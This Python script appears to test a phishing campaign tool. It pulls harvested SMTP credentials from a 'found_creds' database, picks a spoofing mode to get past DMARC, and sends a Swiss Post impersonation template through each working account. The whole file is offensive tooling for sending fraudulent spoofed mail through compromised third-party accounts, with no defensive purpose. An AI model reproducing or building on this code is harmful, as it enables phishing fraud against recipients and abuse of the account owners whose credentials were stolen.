"""Final test: simulate exact bot flow for template send"""
import sys, sqlite3, asyncio, traceback
sys.path.insert(0, '/opt/darkvasend')

# Clean imports
for m in list(sys.modules):
    if 'auditguard' in m:
        del sys.modules[m]

from auditguard.campaign_sender import _send_one, pick_best_spoof_mode
from auditguard.spoof_templates import get_template

db = sqlite3.connect('/opt/darkvasend/bustgo-hunt.db')
db.row_factory = sqlite3.Row

# Test ALL working SMTPs with Swiss Post template
for sid in [5, 6, 2, 4, 7, 9, 10]:
    r = db.execute('SELECT * FROM found_creds WHERE id=? AND auth_ok=1', (sid,)).fetchone()
    if not r:
        continue
    
    smtp_config = {
        'host': r['smtp_host'],
        'port': r['smtp_port'],
        'username': r['smtp_user'],
        'password': r['smtp_password'],
        'from_email': r['smtp_user'],
    }
    tpl = get_template('swisspost')
    
    # Simulate exact bot flow
    best_mode, dmarc = pick_best_spoof_mode(tpl['from_email'])
    actual_from = tpl['from_email']  # No TLD strip anymore
    
    print(f'SMTP #{sid} ({r["smtp_host"]}): ', end='', flush=True)
    
    try:
        result = _send_one(
            smtp_config,
            tpl['from_name'],
            actual_from,
            'numerique.fiscal@gmail.com',
            tpl['subject'],
            tpl['html'],
            '',
            smtp_config.get('from_email', ''),
            tpl.get('reply_to', ''),
            best_mode,
            None,
        )
        if result['success']:
            print(f'OK (mode={result.get("spoof_mode_used","?")})', flush=True)
        else:
            print(f'FAIL: {result.get("error","?")}', flush=True)
    except Exception as e:
        print(f'EXCEPTION: {e}', flush=True)

db.close()
print('\nDONE', flush=True)
